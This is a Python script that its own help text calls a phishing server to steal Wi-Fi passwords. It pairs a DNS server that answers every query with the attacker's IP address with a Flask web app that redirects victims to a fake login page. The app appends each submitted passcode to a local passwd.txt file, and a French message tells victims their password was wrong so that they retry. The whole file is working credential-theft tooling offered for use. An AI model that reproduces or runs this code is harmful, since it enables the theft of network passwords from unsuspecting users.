#!/usr/bin/env python
"""
LICENSE http://www.apache.org/licenses/LICENSE-2.0
"""
import os
import sys
import time
import struct
import argparse
import datetime
import threading
import traceback
import socketserver
from flask import Flask, redirect, render_template, request
try:
    from dnslib import *
except ImportError:
    print("Missing dependency dnslib: <https://pypi.python.org/pypi/dnslib>. Please install it with `pip`.")
    sys.exit(2)


class DomainName(str):
    def __getattr__(self, item):
        return DomainName(item + '.' + self)

def dns_response(data):
    request = DNSRecord.parse(data)
    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)

    qname = request.q.qname
    qn = str(qname) 
    qtype = request.q.qtype
    qt = QTYPE[qtype]
    print(qn)
    for name, rrs in records.items():
        if name == qn or 1 == 1:
            for rdata in rrs:
                rqt = rdata.__class__.__name__
                if qt in ['*', rqt]:
                    reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, rqt), rclass=1, ttl=TTL, rdata=rdata))
        break

    for rdata in ns_records:
        reply.add_ar(RR(rname=D, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))

    reply.add_auth(RR(rname=D, rtype=QTYPE.SOA, rclass=1, ttl=TTL, rdata=soa_record))
    return reply.pack()

class BaseRequestHandler(socketserver.BaseRequestHandler):
    def get_data(self):
        raise NotImplementedError
    def send_data(self, data):
        raise NotImplementedError
    def handle(self):
        now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
        print("\n\n request dns (%s %s):" % (self.client_address[0],self.client_address[1]))
        #print("\n\n%s request %s (%s %s):" % (self.__class__.__name__[:3], now, self.client_address[0],self.client_address[1]))
        try:
            data = self.get_data()
            self.send_data(dns_response(data))
        except Exception:
            pass

class TCPRequestHandler(BaseRequestHandler):
    def get_data(self):
        data = self.request.recv(8192).strip()
        sz = struct.unpack('>H', data[:2])[0]
        if sz < len(data) - 2:
            raise Exception("Wrong size of TCP packet")
        elif sz > len(data) - 2:
            raise Exception("Too big TCP packet")
        return data[2:]

    def send_data(self, data):
        sz = struct.pack('>H', len(data))
        return self.request.sendall(sz + data)

class UDPRequestHandler(BaseRequestHandler):
    def get_data(self):
        return self.request[0].strip()

    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)

def main():
    print("Starting dns server...")

    servers = []
    servers.append(socketserver.ThreadingUDPServer(('', 53), UDPRequestHandler))
    servers.append(socketserver.ThreadingTCPServer(('', 53), TCPRequestHandler))

    for s in servers:
        thread = threading.Thread(target=s.serve_forever)  # that thread will start one more thread for each request
        thread.daemon = True  # exit the server thread when the main thread terminates
        thread.start()
        print("%s server loop running in thread: %s" % (s.RequestHandlerClass.__name__[:3], thread.name))

    try:
        while 1:
            time.sleep(1)
            sys.stderr.flush()
            sys.stdout.flush()
    except KeyboardInterrupt:
        pass
    finally:
        for s in servers:
            s.shutdown()


app1 = Flask('web app',static_folder='static',template_folder='templates')

@app1.errorhandler(404)
def page_not_found(err):
    return redirect('http://{}/'.format(domain))

@app1.route('/')
@app1.route('/index.html')
def home():
    if request.host != domain:
        return redirect('http://{}/'.format(domain))
    return render_template('index.html')

@app1.route('/send.html',methods=['POST'])
def send():
    if 'passcode' in request.form:
        f = open('passwd.txt','a')
        f.write(request.form['passcode']+'\n')
        f.close()
    return redirect('http://{}/'.format(domain))
    return """
    <html>
        <body>
            <p>Le mot de pass saisi est incorrect veillez <a href='/index.html'>ressaiyer</a>
        </body>
    </html>
""",302

if __name__ == '__main__':
    #if os.setuid(0):
    #    exit(1)

    parser = argparse.ArgumentParser(
        description='A pishing server to stole wifi password')
    parser.add_argument(
        'ip', metavar='ip', type=str,
        help='IP address to th server')
    parser.add_argument(
        'domain', metavar='domain', type=str,
        help='The domain of your phishing page',default='monwifi.local')
    
    args = parser.parse_args()
    domain = args.domain

    D = DomainName(domain)
    IP = args.ip
    TTL = 60 * 5

    soa_record = SOA(
        mname=D.ns1,  # primary name server
        rname=D.andrei,  # email of the domain administrator
        times=(
            201307231,  # serial number
            60 * 60 * 1,  # refresh
            60 * 60 * 3,  # retry
            60 * 60 * 24,  # expire
            60 * 60 * 1,  # minimum
        )
    )
    ns_records = [NS(D.ns1), NS(D.ns2)]
    records = {
        D: [A(IP), AAAA((0,) * 16), MX(D.mail), soa_record] + ns_records,
        D.ns1: [A(IP)],  # MX and NS records must never point to a CNAME alias (RFC 2181 section 10.3)
        D.ns2: [A(IP)],
        D.mail: [A(IP)],
        D.andrei: [CNAME(D)],
    }

    try:
        thread1 = threading.Thread(target=main)  # that thread will start one more thread for each request
        thread1.daemon = True  # exit the server thread when the main thread terminates
        #thread1.start() # start dns server
        app1.run(port=80,host=args.ip,debug=False) # start web app
    except KeyboardInterrupt:
        #thread1.shutdown()
        print("Server is down")
